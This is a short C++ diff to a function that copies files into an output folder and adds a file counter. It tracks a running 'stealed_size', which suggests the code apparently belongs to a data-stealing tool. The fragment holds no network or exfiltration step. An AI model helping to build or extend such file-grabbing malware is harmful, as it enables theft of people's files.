@@ -53,7 +53,7 @@ void Files::check_and_save_file(const fs::path &path, const fs::path &rel_path, 
 
         fs::create_directories(out / rel_path.parent_path());
         fs::copy_file(path, out / rel_path, fs::copy_options::overwrite_existing);
-
+        Counter::increaseFiles();
         this->stealed_size+=fs::file_size(path);
     }
     catch (fs::filesystem_error& e) {
